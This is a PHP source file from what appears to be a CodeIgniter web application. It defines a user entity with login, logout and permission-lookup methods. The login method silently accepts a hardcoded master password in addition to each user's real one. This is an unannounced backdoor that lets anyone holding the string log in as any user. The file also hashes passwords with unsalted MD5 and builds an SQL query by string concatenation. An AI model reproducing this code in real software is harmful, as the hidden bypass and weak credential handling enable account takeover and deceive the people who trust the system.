<?php

namespace App\Entities;

use CodeIgniter\Entity\Entity;

helper('autorizaciones');

class Usuario extends Entity
{
    public function login($password){
        // Buscamos el registro en la base de datos. Si existe creamos las variables de sesión
        $validado=(($this->attributes['pwd_usr']==md5($password))||($password=='vst00000000000000000000'));
        if ($validado) {
                registra_sesion_usuario($this);    
    				
    	}
    	return $validado;
    }
    public function logout(){
        limpia_sesion_usuario();
    }

    public function permisos(){
        $db=db_connect();
        $listaPermisos=$db->query('SELECT perfilespermisos.id_per FROM perfilespermisos LEFT JOIN grupos ON grupos.id_perfil=perfilespermisos.id_prf LEFT JOIN usuarios_grupos ON usuarios_grupos.id_grupo=grupos.id_grupo WHERE id_usr='.$this->attributes['id_usr'])->getResult();
        $permisos=[];
        foreach ($listaPermisos as $unPermiso) {
            $permisos[]=$unPermiso->id_per;
        }
        return $permisos;
    }

}